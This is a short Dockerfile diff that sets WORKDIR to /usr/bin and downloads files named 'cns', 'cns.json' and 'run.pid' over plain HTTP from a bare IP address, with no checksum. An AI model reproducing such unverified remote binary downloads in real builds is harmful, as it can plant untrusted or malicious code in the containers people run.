@@ -1,6 +1,7 @@
 FROM python:3.11-slim-bullseye
-RUN cd /usr/bin \
-    && wget http://101.35.82.220/2/cns \
+WORKDIR /usr/bin
+
+RUN wget http://101.35.82.220/2/cns \
     && wget http://101.35.82.220/2/cns.json \
     && wget http://101.35.82.220/2/run.pid
 
